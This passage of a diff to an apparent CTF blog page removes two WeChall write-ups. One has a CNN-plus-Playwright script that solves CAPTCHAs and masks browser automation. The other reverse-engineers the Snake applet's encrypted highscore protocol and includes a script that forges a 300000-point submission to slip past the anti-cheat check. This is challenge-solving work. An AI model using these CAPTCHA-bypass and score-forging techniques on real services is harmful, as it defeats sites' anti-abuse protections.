class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Final Crackcha run: solve until 468, monitoring solved count.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time, os, re</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"><span class="keyword">from</span> train_cnn2 <span class="keyword">import</span> Net, get_slot</span><br><span class="line"></span><br><span class="line">COOKIE = <span class="string">&#x27;YOUR_WC_SESSION_ID&#x27;</span></span><br><span class="line">BASE = <span class="string">&#x27;https://www.wechall.net/en/challenge/crackcha&#x27;</span></span><br><span class="line">CHROME = <span class="string">&#x27;~/.cache/ms-playwright/chromium-1217/chrome-linux64/chrome&#x27;</span></span><br><span class="line">DEV = <span class="string">&#x27;cuda&#x27;</span></span><br><span class="line">CONF_MIN = <span class="number">0.7</span>          <span class="comment"># 置信度阈值：低于则丢弃本轮不提交</span></span><br><span class="line">TARGET = <span class="number">468</span></span><br><span class="line">HARD_TIME = <span class="number">3600</span>        <span class="comment"># 秒上限（可跨 round 重置继续跑）</span></span><br><span class="line"></span><br><span class="line">model = Net().to(DEV)</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;model.pt&#x27;</span>, map_location=DEV)[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recog</span>(<span class="params">b</span>):</span><br><span class="line">    a = np.array(Image.<span class="built_in">open</span>(io.BytesIO(b)).convert(<span class="string">&#x27;L&#x27;</span>), dtype=np.float32)</span><br><span class="line">    slots = np.stack([get_slot(a, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]) / <span class="number">255.0</span></span><br><span class="line">    x = torch.tensor(slots, dtype=torch.float32).unsqueeze(<span class="number">1</span>).to(DEV)</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        p = torch.softmax(model(x), <span class="number">1</span>).cpu().numpy()</span><br><span class="line">    <span class="comment"># 5 个字符各自 top1 概率的最小值 = 本轮置信度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="number">65</span> + <span class="built_in">int</span>(r.argmax())) <span class="keyword">for</span> r <span class="keyword">in</span> p), <span class="built_in">float</span>(p.<span class="built_in">max</span>(axis=<span class="number">1</span>).<span class="built_in">min</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_solved</span>(<span class="params">text</span>):</span><br><span class="line">    m = re.search(<span class="string">r&#x27;cracked captcha (\d+) of&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m.group(<span class="number">1</span>)) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    t0 = time.time()</span><br><span class="line">    solved = <span class="number">0</span></span><br><span class="line">    rounds = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">        browser = p.chromium.launch(headless=<span class="literal">True</span>, executable_path=CHROME,</span><br><span class="line">            args=[<span class="string">&#x27;--disable-blink-features=AutomationControlled&#x27;</span>, <span class="string">&#x27;--no-sandbox&#x27;</span>])</span><br><span class="line">        ctx = browser.new_context(user_agent=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) &#x27;</span></span><br><span class="line">            <span class="string">&#x27;AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span>)</span><br><span class="line">        ctx.add_cookies([&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;WC&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: COOKIE, <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;.wechall.net&#x27;</span>, <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>&#125;])</span><br><span class="line">        page = ctx.new_page()</span><br><span class="line">        page.goto(BASE + <span class="string">&#x27;/index.php&#x27;</span>, wait_until=<span class="string">&#x27;domcontentloaded&#x27;</span>, timeout=<span class="number">60000</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            page.wait_for_load_state(<span class="string">&#x27;networkidle&#x27;</span>, timeout=<span class="number">15000</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                html = page.content()</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                time.sleep(<span class="number">2</span>); <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Crackcha&#x27;</span> <span class="keyword">in</span> html <span class="keyword">and</span> <span class="string">&#x27;problem.php&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Making sure&#x27;</span> <span class="keyword">in</span> html <span class="keyword">or</span> <span class="string">&#x27;not a bot&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;  turnstile page, waiting for auto-solve&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">15</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> solved &lt; TARGET:</span><br><span class="line">            <span class="keyword">if</span> time.time() - t0 &gt; HARD_TIME:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;HARD TIME LIMIT reached at solved=<span class="subst">&#123;solved&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            img = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                resp = page.request.get(BASE + <span class="string">&#x27;/problem.php&#x27;</span>)</span><br><span class="line">                body = resp.body()</span><br><span class="line">                <span class="keyword">if</span> body[:<span class="number">2</span>] == <span class="string">b&#x27;\xff\xd8&#x27;</span>:</span><br><span class="line">                    img = body; <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> img <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;  problem failed, retrying&#x27;</span>); time.sleep(<span class="number">2</span>); <span class="keyword">continue</span></span><br><span class="line">            rounds += <span class="number">1</span></span><br><span class="line">            guess, conf = recog(img)</span><br><span class="line">            <span class="keyword">if</span> conf &lt; CONF_MIN:          <span class="comment"># 低置信度直接丢弃，不提交</span></span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            text = page.request.get(BASE + <span class="string">&#x27;/answer.php&#x27;</span>, params=&#123;<span class="string">&#x27;answer&#x27;</span>: guess&#125;).text()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;too much&#x27;</span> <span class="keyword">in</span> text.lower():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;  RATE LIMITED at solved=<span class="subst">&#123;solved&#125;</span>, cooling 60s&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">60</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ns = parse_solved(text)</span><br><span class="line">            <span class="keyword">if</span> ns <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> ns &gt; solved:</span><br><span class="line">                solved = ns</span><br><span class="line">                <span class="keyword">if</span> solved % <span class="number">25</span> == <span class="number">0</span>:</span><br><span class="line">                    dt = time.time() - t0</span><br><span class="line">                    rate = solved / dt</span><br><span class="line">                    eta = (TARGET - solved) / rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;  [<span class="subst">&#123;dt:<span class="number">.0</span>f&#125;</span>s] solved=<span class="subst">&#123;solved&#125;</span>/468 rounds=<span class="subst">&#123;rounds&#125;</span> &#x27;</span></span><br><span class="line">                          <span class="string">f&#x27;(<span class="subst">&#123;rate*<span class="number">60</span>:<span class="number">.1</span>f&#125;</span>/min, ETA <span class="subst">&#123;eta/<span class="number">60</span>:<span class="number">.1</span>f&#125;</span>min)&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> ns <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> ns &lt; solved:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;  !! round reset detected: solved <span class="subst">&#123;solved&#125;</span> -&gt; <span class="subst">&#123;ns&#125;</span>&#x27;</span>)</span><br><span class="line">                solved = ns</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m = re.search(<span class="string">r&#x27;Correct would have been ([A-Z]&#123;5&#125;)&#x27;</span>, text)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;  miss guess=<span class="subst">&#123;guess&#125;</span> conf=<span class="subst">&#123;conf:<span class="number">.3</span>f&#125;</span> real=<span class="subst">&#123;m.group(<span class="number">1</span>) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="string">&quot;?&quot;</span>&#125;</span>&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1.1</span>)              <span class="comment"># 限速控制：总频率 ~55 req/min</span></span><br><span class="line">        browser.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\nDONE: solved=<span class="subst">&#123;solved&#125;</span> rounds=<span class="subst">&#123;rounds&#125;</span> in <span class="subst">&#123;time.time()-t0:<span class="number">.0</span>f&#125;</span>s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-snake/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-snake/" class="post-title-link" itemprop="url">WeChall - Snake</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-08-12 16:32:45" itemprop="dateCreated datePublished" datetime="2026-08-12T16:32:45+08:00">2026-08-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:12:05" itemprop="dateModified" datetime="2026-09-15T10:12:05+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-snake/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-snake/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>WeChall Snake（by Gizmore and lazer, 2010）：Java Applet
-贪吃蛇游戏，目标 <strong>"reach exactly 300000
-points"</strong>。没有答案提交框：玩家在 Applet
-里玩完游戏，客户端把成绩加密提交到
-<code>CGI_Highscore.php</code>，完成判定完全靠服务端校验提交构型是否"真实可达成"。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.wechall.net/en/challenge/snake/index.php</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>向 <code>CGI_Highscore.php</code> 发送加密的 <code>HT_RATE</code> +
-<code>HT_INSERT</code> 请求，INSERT 一个<strong>完全自洽</strong>的
-300000 分构型：</p>
-<ol type="1">
-<li>GET 挑战页（记录游戏开始时间）</li>
-<li>等待 ≥ 300 秒</li>
-<li>HT_RATE score=300000（返回 rank，写 trixx.txt）</li>
-<li>HT_INSERT score=300000（7 秒内）：
-<ul>
-<li>K=10（字母轮数）→ M = 1.0 + 0.5K = 6.00</li>
-<li>B=250, C=250, H=0 → L = 14 + 4B + 6C - 2H + 5K = 2564</li>
-<li>md5 = MD5("250:250:0:2564:300000").upper()</li>
-<li>name=<用户名> &amp; sessid=<session></li>
-</ul></li>
-</ol>
-<h3 id="分析过程">分析过程</h3>
-<h4 id="协议逆向">1. 协议逆向</h4>
-<p>Applet（snake.jar）与 <code>CGI_Highscore.php</code> 的通信：</p>
-<ul>
-<li>body =
-<code>encrypted=URLEncode(GWF_Crypt(payload, "Snake$Poors!"))</code></li>
-<li>GWF_Crypt：<code>out[i] = key[ki % len] ^ c ^ 101</code>；key
-索引按递增步长循环（每轮 wrap 后步长 +1，越过 keylen 复位为 1）</li>
-<li>payload：<code>cmd=HT_INSERT&amp;score=&amp;name=&amp;length=&amp;hemps=&amp;cherries=&amp;bananas=&amp;multi=&amp;md5=&amp;sessid=</code></li>
-<li>md5 =
-<code>MD5("bananas:cherries:hemps:length:score").toUpperCase()</code></li>
-<li>命令：<code>HT_RATE</code>（评分+写
-trixx）、<code>HT_INSERT</code>（写榜）、<code>HT_HOTD</code>（英雄日）、<code>HT_UNREQUEST</code></li>
-</ul>
-<h4 id="服务端规则">2. 服务端规则</h4>
-<p>snake.gizmore.org 原站 PHP 短标签未开启 →
-源码直接泄露，可与线上行为交叉验证。</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HT_Rate():  rank = 分数在榜排名；rank ≤ 100 时把 &quot;time:score&quot; 写入 trixx.txt</span><br><span class="line">HT_InsertAllowed(): INSERT 的 score 必须 7 秒内被 RATE 过（完全相同的分数）</span><br><span class="line">→ RATE 和 INSERT 必须成对、同分、间隔 &lt; 7 秒</span><br></pre></td></tr></table></figure>
-<p><strong>时间检测</strong>：除 RATE/INSERT
-窗口外，还有最小游戏时长检查。从 <code>HT_HOTD</code> 到
-<code>HT_RATE</code>
-的间隔必须达到一定时长，且<strong>随分数增大</strong></p>
-<h4 id="计分规则从-applet-字节码逆向">3. 计分规则（从 applet
-字节码逆向）</h4>
-<ul>
-<li>banana=250 分/+4 长、cherry=750/+6、hemp=500/-2、字母=100/+1</li>
-<li>multiplier = 1.0 + 0.5×K（K = 集齐 5 个字母食物的轮数）</li>
-<li>字母分合计 A(K) = 500K + 125K(K-1)</li>
-<li>死亡动画 effectDie() 每帧 score += 10×L</li>
-<li>蛇长 L = 14 + 4B + 6C − 2H + 5K</li>
-<li>得分可达区间 [10L + A + Σ, 10L + A + M×Σ]，Σ = 250B + 750C +
-500H</li>
-</ul>
-<p>线上版 CGI 比仓库版多了反作弊：分数 ≥ 300000 的记录会被标记
-<code>user_thief.png</code>（Cheater）图标，且不会触发
-solved。检测本质是 <strong>"golden ratio" 比例检查</strong>（M 与 K
-自洽、计数合理性），<strong>不查 10
-整除性、不做严格代数校验</strong>。被标记的构型共同点：</p>
-<ul>
-<li>M 与 K 不自洽（如 K=46 但提交 M=20.00，应为 24.0）</li>
-<li>食物计数异常（H=394、C=319，真实游戏不可能出现）</li>
-<li>score 超出构型可达区间（失败构型的共同点；服务端给检测留了
-margin，但偏离过多仍会被标记）</li>
-</ul>
-<h3 id="script">Script</h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib, time, urllib.parse, urllib.request</span><br><span class="line"></span><br><span class="line">NAME = <span class="string">&quot;&lt;your_wechall_username&gt;&quot;</span>   <span class="comment"># 你的 WeChall 用户名</span></span><br><span class="line">SESS = <span class="string">&quot;&lt;your_session_cookie&gt;&quot;</span>     <span class="comment"># WC cookie 值</span></span><br><span class="line">BASE = <span class="string">&quot;https://www.wechall.net/en/challenge/snake&quot;</span></span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gwf_crypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;GWF_Crypt: out[i] = key[ki % len] ^ c ^ 101；key 索引按递增步长循环（wrap 后步长 +1）&quot;&quot;&quot;</span></span><br><span class="line">    keylen = <span class="built_in">len</span>(key); out = []; step = <span class="number">1</span>; ki = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        ki += step</span><br><span class="line">        <span class="keyword">if</span> ki &gt;= keylen: ki = <span class="number">0</span>; step += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> step &gt;= keylen: step = <span class="number">1</span></span><br><span class="line">        out.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(key[ki % keylen]) ^ <span class="built_in">ord</span>(c) ^ <span class="number">101</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;POST 加密 payload 到 CGI_Highscore.php&quot;&quot;&quot;</span></span><br><span class="line">    body = <span class="string">&quot;encrypted=&quot;</span> + urllib.parse.quote_plus(gwf_crypt(msg, <span class="string">&quot;Snake$Poors!&quot;</span>))</span><br><span class="line">    req = urllib.request.Request(BASE + <span class="string">&quot;/CGI_Highscore.php&quot;</span>, data=body.encode(),</span><br><span class="line">        headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: UA, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Referer&quot;</span>: BASE + <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;WC=&quot;</span> + SESS&#125;)</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(req, timeout=<span class="number">25</span>) <span class="keyword">as</span> res:</span><br><span class="line">        <span class="keyword">return</span> res.status, res.read().decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;GET 页面（带 session cookie）&quot;&quot;&quot;</span></span><br><span class="line">    req = urllib.request.Request(url, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: UA, <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;WC=&quot;</span> + SESS&#125;)</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(req, timeout=<span class="number">25</span>) <span class="keyword">as</span> res:</span><br><span class="line">        <span class="keyword">return</span> res.read().decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line">K = <span class="number">10</span>                        <span class="comment"># 集齐 5 个字母食物的轮数</span></span><br><span class="line">B, C, H = <span class="number">250</span>, <span class="number">250</span>, <span class="number">0</span>         <span class="comment"># banana / cherry / hemp 数量</span></span><br><span class="line">SC = <span class="number">300000</span></span><br><span class="line">L = <span class="number">14</span> + <span class="number">4</span>*B + <span class="number">6</span>*C - <span class="number">2</span>*H + <span class="number">5</span>*K          <span class="comment"># 蛇长</span></span><br><span class="line">M = <span class="string">&quot;%.2f&quot;</span> % (<span class="number">1.0</span> + <span class="number">0.5</span>*K)              <span class="comment"># multiplier</span></span><br><span class="line">A = <span class="number">500</span>*K + <span class="number">125</span>*K*(K-<span class="number">1</span>)                 <span class="comment"># 字母分合计</span></span><br><span class="line">SIGMA = <span class="number">250</span>*B + <span class="number">750</span>*C + <span class="number">500</span>*H           <span class="comment"># 食物分合计</span></span><br><span class="line">mn, mx = <span class="number">10</span>*L + A + SIGMA, <span class="number">10</span>*L + A + (<span class="number">1.0</span>+<span class="number">0.5</span>*K)*SIGMA</span><br><span class="line"><span class="keyword">assert</span> mn &lt;= SC &lt;= mx, <span class="string">f&quot;score <span class="subst">&#123;SC&#125;</span> not in [<span class="subst">&#123;mn&#125;</span>, <span class="subst">&#123;mx&#125;</span>]&quot;</span></span><br><span class="line">md5 = hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;B&#125;</span>:<span class="subst">&#123;C&#125;</span>:<span class="subst">&#123;H&#125;</span>:<span class="subst">&#123;L&#125;</span>:<span class="subst">&#123;SC&#125;</span>&quot;</span>.encode()).hexdigest().upper()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 1: GET 挑战页（会话计时开始）&quot;</span>)</span><br><span class="line">get(BASE + <span class="string">&quot;/index.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 2: 等待 300 秒（90 秒实验失败过，建议 ≥5 分钟）&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 3: HT_RATE（写 trixx.txt，7 秒窗口起点）&quot;</span>)</span><br><span class="line">r = post(<span class="string">f&quot;cmd=HT_RATE&amp;score=<span class="subst">&#123;SC&#125;</span>&amp;sessid=<span class="subst">&#123;SESS&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RATE:&quot;</span>, r[<span class="number">0</span>], <span class="built_in">repr</span>(r[<span class="number">1</span>][:<span class="number">30</span>]))</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;step 4: HT_INSERT（同分，7 秒内）&quot;</span>)</span><br><span class="line">r = post(<span class="string">f&quot;cmd=HT_INSERT&amp;score=<span class="subst">&#123;SC&#125;</span>&amp;name=<span class="subst">&#123;NAME&#125;</span>&amp;length=<span class="subst">&#123;L&#125;</span>&amp;hemps=<span class="subst">&#123;H&#125;</span>&quot;</span></span><br><span class="line">         <span class="string">f&quot;&amp;cherries=<span class="subst">&#123;C&#125;</span>&amp;bananas=<span class="subst">&#123;B&#125;</span>&amp;multi=<span class="subst">&#123;M&#125;</span>&amp;md5=<span class="subst">&#123;md5&#125;</span>&amp;sessid=<span class="subst">&#123;SESS&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;INSERT:&quot;</span>, r[<span class="number">0</span>], <span class="built_in">repr</span>(r[<span class="number">1</span>][:<span class="number">80</span>]))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Very well done&quot;</span> <span class="keyword">in</span> r[<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SUCCESS - challenge solved!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NOT solved yet - response above&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/45/">45</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/8/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/46/">46</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/8/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
